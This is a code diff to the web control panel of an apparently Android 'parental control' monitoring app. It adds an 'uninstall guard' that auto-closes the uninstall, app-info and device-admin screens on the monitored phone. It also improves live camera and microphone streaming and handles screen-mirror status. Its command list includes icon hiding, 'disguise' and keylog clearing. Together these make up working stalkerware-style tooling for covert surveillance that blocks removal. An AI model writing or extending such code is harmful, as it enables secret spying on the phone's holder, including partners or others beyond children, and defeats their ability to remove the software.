@@ -955,6 +955,15 @@
               <button id="lock-device-btn" class="btn btn-red" onclick="triggerDeviceLock()">
                 <i class="fa-solid fa-lock"></i> Lock
               </button>
+              <button id="guard-on-btn" class="btn btn-green btn-icon" onclick="setUninstallGuard(true)" title="ARM self-protection — auto-block uninstall / app-info / device-admin screens on the child's phone">
+                <i class="fa-solid fa-shield-halved"></i>
+              </button>
+              <button id="guard-off-btn" class="btn btn-ghost btn-icon" onclick="setUninstallGuard(false)" title="DISARM self-protection guard temporarily (while you manage the device)">
+                <i class="fa-solid fa-shield"></i>
+              </button>
+              <button id="uninstall-mode-btn" class="btn btn-red btn-icon" onclick="enableUninstallMode()" title="ALLOW UNINSTALL (remove supervision) — disables guard, removes device-admin & restores icon. Use only with the device in hand.">
+                <i class="fa-solid fa-box-open"></i>
+              </button>
               <button id="hide-icon-btn" class="btn btn-ghost btn-icon hidden" onclick="remoteToggleIconVisibility('hide_icon')" title="Hide app icon">
                 <i class="fa-solid fa-eye-slash"></i>
               </button>
@@ -970,6 +979,7 @@
             </div>
           </div>
           <div style="padding:10px 14px;border-top:1px solid var(--border);display:flex;align-items:center;gap:8px;flex-wrap:wrap;">
+            <span id="guard-state-chip" class="chip chip-green">🛡️ Self-protect: ARMED</span>
             <span style="font-size:11px;color:var(--text-3);"><i class="fa-solid fa-comment-dots"></i> Toast:</span>
             <input type="text" id="toast-input" placeholder="Send a message to child's phone…"
               style="flex:1;min-width:160px;" onkeydown="if(event.key==='Enter')sendToast()">
@@ -1600,13 +1610,19 @@
           }
         } else if (data.type === 'camera_stream_frame') {
           if (selectedDeviceId === data.deviceId) {
-            document.getElementById('live-cam-display').innerHTML =
-              `<img src="${data.image}" style="border-radius:8px;width:100%;max-height:300px;object-fit:contain;border:1px solid var(--border);">`;
-            document.getElementById('live-cam-status').textContent = `📹 LIVE ${data.facing === 'front' ? 'Front' : 'Back'} camera — ${new Date().toLocaleTimeString()}`;
+            setCameraFrame(data.image, data.facing, data.time);
             if (!liveCamOn) { liveCamOn = true; setLiveCamButtons(); }
           }
         } else if (data.type === 'audio_stream_chunk') {
           if (selectedDeviceId === data.deviceId) handleAudioChunk(data);
+        } else if (data.type === 'mirror_status') {
+          if (selectedDeviceId === data.deviceId) handleMirrorStatus(data);
+        } else if (data.type === 'uninstall_guard_event') {
+          if (selectedDeviceId === data.deviceId) {
+            const gDetail = data.detail || 'Removal attempt blocked — returned to home screen';
+            showToast(`🛡️ ${gDetail}`, 'info');
+            addEventsFeedLine({ kind: 'guard', text: `${new Date().toLocaleTimeString()} 🛡️ ${gDetail}` });
+          }
         } else if (data.type === 'geofence_event' || data.type === 'app_install_event') {
           addEventsFeedLine(data);
         } else if (data.type === 'notification') {
@@ -2025,6 +2041,66 @@
     btns.forEach(b => b.classList.toggle('btn-gradient', false));
   }
 
+  // Reuse a single <img> element so camera frames decode without rebuilding the DOM each time.
+  let liveCamImgEl = null;
+  function setCameraFrame(base64Image, facing, time) {
+    const display = document.getElementById('live-cam-display');
+    if (!display) return;
+    const finalSrc = base64Image && base64Image.startsWith('data:')
+      ? base64Image : 'data:image/jpeg;base64,' + (base64Image || '');
+    if (!liveCamImgEl || !liveCamImgEl.isConnected) {
+      liveCamImgEl = document.createElement('img');
+      liveCamImgEl.style.cssText = 'border-radius:8px;width:100%;max-height:300px;object-fit:contain;border:1px solid var(--border);background:#000;';
+      display.innerHTML = '';
+      display.appendChild(liveCamImgEl);
+    }
+    if (liveCamImgEl.src !== finalSrc) liveCamImgEl.src = finalSrc;
+    const st = document.getElementById('live-cam-status');
+    const t = time ? new Date(time).toLocaleTimeString() : new Date().toLocaleTimeString();
+    if (st) st.textContent = `📹 LIVE ${facing === 'front' ? 'Front' : 'Back'} camera — ${t}`;
+  }
+
+  function handleMirrorStatus(data) {
+    const dev = (devicesList || []).find(d => d.id === data.deviceId);
+    if (data.active === true && dev) dev.isMirroring = true;
+    if (data.active === false) {
+      if (dev) dev.isMirroring = false;
+      // Only drop out of mirror UI when the device truly isn't casting anymore.
+      if (!(dev && dev.isMirroring)) {
+        isMirrorActive = false;
+        updateControlsForMirror();
+        const dev2 = devicesList.find(d => d.id === data.deviceId);
+        if (dev2) dev2.isMirroring = false;
+      }
+    }
+    if (data.message) showToast(data.message, data.active === false ? 'error' : 'success');
+    if (data.active === false) addEventsFeedLine({ kind: 'mirror', text: `${new Date().toLocaleTimeString()} 📺 Mirror: ${data.message || 'stopped/denied'}` });
+  }
+
+  // ── Self-protection (uninstall guard) ─────────────────────────
+  function updateGuardChip(deviceId) {
+    const chip = document.getElementById('guard-state-chip');
+    if (!chip) return;
+    const dev = (devicesList || []).find(d => d.id === (deviceId || selectedDeviceId));
+    const on = dev ? dev.uninstallGuard !== false : true;
+    chip.textContent = on ? '🛡️ Self-protect: ARMED' : '⚠️ Self-protect: OFF (uninstall allowed)';
+    chip.className = on ? 'chip chip-green' : 'chip chip-red';
+  }
+
+  function setUninstallGuard(on) {
+    if (!selectedDeviceId || !ws) { showToast('⚠️ No device selected', 'info'); return; }
+    if (!on && !confirm('DISARM self-protection guard on this device?\n\nWhile OFF, a child could open Settings and reach Uninstall / device-admin screens.\n\nOnly disable while a parent is physically managing the device.')) return;
+    ws.send(JSON.stringify({ type: 'command', targetDeviceId: selectedDeviceId, command: 'set_uninstall_guard', enabled: !!on }));
+    showToast(on ? '🛡️ Arming self-protection guard…' : '🛡️ Disarming self-protection guard…', 'info');
+  }
+
+  function enableUninstallMode() {
+    if (!selectedDeviceId || !ws) { showToast('⚠️ No device selected', 'info'); return; }
+    if (!confirm('START UNINSTALL MODE (remove supervision)?\n\n• Disables the self-protect guard\n• Removes device-admin (so the app can be uninstalled)\n• Restores the app icon in the launcher\n\n⚠️ Do this ONLY while holding the child\'s device.')) return;
+    ws.send(JSON.stringify({ type: 'command', targetDeviceId: selectedDeviceId, command: 'uninstall_mode' }));
+    showToast('🗑️ Uninstall mode request sent — check device & ack…', 'info');
+  }
+
   function startCameraStream(facing) {
     if (!selectedDeviceId || !ws) { showToast('⚠️ No device selected', 'info'); return; }
     ws.send(JSON.stringify({ type: 'command', targetDeviceId: selectedDeviceId, command: 'start_camera_stream', facing }));
@@ -2045,15 +2121,36 @@
     showToast('⏹️ Live streams stopped', 'info');
   }
 
-  // WebAudio live playback of raw PCM16LE mono chunks
-  let audioCtx = null, nextPlayTime = 0;
+  // WebAudio gapless playback of raw PCM16LE mono chunks.
+  // A single ScriptProcessor output pulls samples from a FIFO that has already
+  // been resampled to the context sample rate, so all chunks play back-to-back
+  // with no per-chunk AudioBufferSourceNode resample/gap crackle.
+  let audioCtx = null;
+  let audioFifo = [];       // Array of Float32Array at audioCtx.sampleRate
+  let audioFifoOff = 0;     // read offset inside audioFifo[0]
+  let audioProc = null;
 
   function ensureAudioCtx() {
     if (!audioCtx) {
       const AC = window.AudioContext || window.webkitAudioContext;
       if (!AC) return false;
       audioCtx = new AC();
-      nextPlayTime = 0;
+      audioFifo = [];
+      audioFifoOff = 0;
+      audioProc = audioCtx.createScriptProcessor(4096, 0, 1);
+      audioProc.onaudioprocess = ev => {
+        const out = ev.outputBuffer.getChannelData(0);
+        for (let i = 0; i < out.length; i++) {
+          const chunk = audioFifo[0];
+          if (!chunk) { out[i] = 0; continue; }
+          out[i] = chunk[audioFifoOff];
+          if (++audioFifoOff >= chunk.length) {
+            audioFifo.shift();
+            audioFifoOff = 0;
+          }
+        }
+      };
+      audioProc.connect(audioCtx.destination);
     }
     if (audioCtx.state === 'suspended') audioCtx.resume();
     return true;
@@ -2066,6 +2163,12 @@
     return bytes;
   }
 
+  function audioTotalBuffered() {
+    let s = audioFifo.length ? (audioFifo[0].length - audioFifoOff) : 0;
+    for (let i = 1; i < audioFifo.length; i++) s += audioFifo[i].length;
+    return s;
+  }
+
   function handleAudioChunk(data) {
     if (!micLiveOn) return;
     if (!ensureAudioCtx()) return;
@@ -2073,12 +2176,13 @@
     const pcm = b64ToBytes(data.base64 || '');
     if (pcm.length < 2) return;
     const n = Math.floor(pcm.length / 2);
-    const float = new Float32Array(n);
+    const floatIn = new Float32Array(n);
     let peak = 0;
     for (let i = 0; i < n; i++) {
-      const sample = (pcm[i*2] | (pcm[i*2+1] << 8));
+      // int16 LE → float; the extra shift keeps the value signed across browsers.
+      const sample = ((pcm[i*2] | (pcm[i*2+1] << 8)) << 16) >> 16;
       const v = sample / 32768;
-      float[i] = v;
+      floatIn[i] = v;
       peak = Math.max(peak, Math.abs(v));
     }
     // Visual meter
@@ -2088,16 +2192,31 @@
     segs.forEach((s, i) => s.style.background = i < activeSegs ? '#f87171' : '#2b3245');
     if (meterEl) meterEl.textContent = peak > 0.03 ? '🔴 LIVE' : '🎙️ LIVE (silence)';
 
-    const buffer = audioCtx.createBuffer(1, n, rate);
-    buffer.copyToChannel(float, 0);
-    const src = audioCtx.createBufferSource();
-    src.buffer = buffer;
-    src.connect(audioCtx.destination);
-    if (nextPlayTime < audioCtx.currentTime + 0.05) nextPlayTime = audioCtx.currentTime + 0.05;
-    // Skip backlog to avoid growing latency
-    if (nextPlayTime - audioCtx.currentTime > 1.5) nextPlayTime = audioCtx.currentTime + 0.05;
-    src.start(nextPlayTime);
-    nextPlayTime += buffer.duration;
+    // Resample chunk to the context sample rate before queueing.
+    const outRate = audioCtx.sampleRate;
+    if (rate === outRate) {
+      audioFifo.push(floatIn);
+    } else {
+      const ratio = rate / outRate;
+      const m = Math.max(1, Math.round(n / ratio));
+      const out = new Float32Array(m);
+      for (let i = 0; i < m; i++) {
+        const pos = i * ratio;
+        const i0 = Math.min(n - 1, Math.floor(pos));
+        const frac = pos - i0;
+        const i1 = Math.min(n - 1, i0 + 1);
+        out[i] = floatIn[i0] * (1 - frac) + floatIn[i1] * frac;
+      }
+      audioFifo.push(out);
+    }
+
+    // Bound latency: if more than ~2s is buffered, drop old chunks to catch up.
+    const maxLatency = outRate * 2;
+    let guard = 0;
+    while (audioFifo.length > 1 && audioTotalBuffered() > maxLatency && guard++ < 20) {
+      audioFifo.shift();
+      audioFifoOff = 0;
+    }
   }
 
   function startMicStream() {
@@ -2128,8 +2247,11 @@
     renderMicMeter(false);
     const st = document.getElementById('mic-status');
     if (st) st.textContent = 'Not streaming.';
+    try { if (audioProc) { audioProc.disconnect(); audioProc = null; } } catch (e) {}
     try { if (audioCtx) audioCtx.close(); } catch (e) {}
     audioCtx = null;
+    audioFifo = [];
+    audioFifoOff = 0;
   }
 
   // ── Network / Usage / Geofence / App events ───────────────────
@@ -2183,6 +2305,10 @@
       line = `<div style="padding:3px 0;border-bottom:1px solid var(--border);">${emoji} App <b>${data.app}</b> ${verb} — ${t}</div>`;
     } else if (data.kind === 'geofence') {
       line = `<div style="padding:3px 0;border-bottom:1px solid var(--border);color:var(--amber);">${data.text}</div>`;
+    } else if (data.kind === 'guard') {
+      line = `<div style="padding:3px 0;border-bottom:1px solid var(--border);color:#fbbf24;">${data.text}</div>`;
+    } else if (data.kind === 'mirror') {
+      line = `<div style="padding:3px 0;border-bottom:1px solid var(--border);color:#38bdf8;">${data.text}</div>`;
     } else { return; }
     const existing = feed.querySelector('span');
     if (existing) existing.remove();
@@ -2254,12 +2380,17 @@
     }
 
     if (data.type === 'get_info_result') {
+      const guardOn = data.uninstall_guard !== false;
+      const dev = devicesList.find(d => d.id === data.deviceId);
+      if (dev) dev.uninstallGuard = guardOn;
+      updateGuardChip(data.deviceId);
       const rows = [
         ['Model', `${data.brand || ''} ${data.model || ''}`.trim()],
         ['Android', `${data.android_version || '—'} (SDK ${data.sdk || '—'})`],
         ['Battery', `${data.battery !== undefined ? data.battery + '%' : '—'}${data.is_charging ? ' ⚡' : ''}`],
         ['Device ID', data.device_id || data.deviceId || '—'],
         ['Screen Used', `${data.screen_time_used !== undefined ? data.screen_time_used + ' min' : '—'}`],
+        ['Self-Protect', guardOn ? '🛡️ Armed — uninstall / device-admin screens auto-close' : '⚠️ Guard OFF'],
         ['Blocked Apps', (data.blocked_apps || 'none')]
       ];
       document.getElementById('device-info-display').innerHTML = rows.map(([k, v]) =>
@@ -2421,8 +2552,16 @@
   function handleCommandResponse(data) {
     const icon = data.success ? '✅' : '❌';
     const t = data.success ? 'success' : 'error';
-    const names = { lock:'Lock Screen', buzz:'Vibrate', hide_icon:'Hide Icon', unhide_icon:'Restore Icon', update_policy:'Policy Update', torch_on:'Torch ON', torch_off:'Torch OFF', show_toast:'Toast', take_screenshot:'Screenshot', get_info:'Device Info', start_live_location:'Live Location Start', stop_live_location:'Live Location Stop', block_app:'Block App', unblock_app:'Unblock App', ring:'Ring Loud', open_url:'Open URL', clear_keylog:'Clear Keylog' };
+    const names = { lock:'Lock Screen', buzz:'Vibrate', hide_icon:'Hide Icon', unhide_icon:'Restore Icon', update_policy:'Policy Update', torch_on:'Torch ON', torch_off:'Torch OFF', show_toast:'Toast', take_screenshot:'Screenshot', get_info:'Device Info', start_live_location:'Live Location Start', stop_live_location:'Live Location Stop', block_app:'Block App', unblock_app:'Unblock App', ring:'Ring Loud', open_url:'Open URL', clear_keylog:'Clear Keylog', set_uninstall_guard:'Self-Protect Guard', uninstall_mode:'Uninstall Mode', start_camera_stream:'Camera Stream', stop_camera_stream:'Camera Stream Stop', start_audio_stream:'Mic Stream', stop_audio_stream:'Mic Stream Stop', set_disguise:'Disguise' };
     showToast(`${icon} ${names[data.command] || data.command}: ${data.message}`, t);
+    const dev = (devicesList || []).find(d => d.id === data.deviceId);
+    if (data.command === 'set_uninstall_guard' && data.success) {
+      if (dev) dev.uninstallGuard = /ARMED/.test(data.message || '');
+      updateGuardChip(data.deviceId);
+    } else if (data.command === 'uninstall_mode' && data.success) {
+      if (dev) dev.uninstallGuard = false;
+      updateGuardChip(data.deviceId);
+    }
   }
 
   function handleAppBlockedAlert(data) {
